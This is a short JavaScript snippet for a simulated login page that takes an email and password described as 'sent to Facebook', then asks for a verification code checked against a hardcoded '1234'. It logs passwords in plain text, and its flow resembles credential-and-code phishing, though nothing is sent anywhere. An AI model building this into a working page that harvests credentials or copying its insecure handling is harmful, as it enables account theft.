document.getElementById("loginForm").addEventListener("submit", function (event) {
    event.preventDefault();

    // Simulate sending data to Facebook (this should be done via a backend service)
    const email = document.getElementById("email").value;
    const password = document.getElementById("password").value;

    // Here you would normally send data to your server
    console.log(`Sending to Facebook: ${email}, ${password}`);

    // Simulate the process of asking for a code
    document.getElementById("loginForm").classList.add("hidden");
    document.getElementById("codeInput").classList.remove("hidden");
});

document.getElementById("verifyButton").addEventListener("click", function () {
    const code = document.getElementById("verificationCode").value;

    // Simulate code verification (replace with your actual logic)
    if (code === "1234") { // Assume "1234" is the valid code
        document.getElementById("message").innerText = "Login successful!";
    } else {
        document.getElementById("message").innerText = "Invalid code, try again.";
    }
});
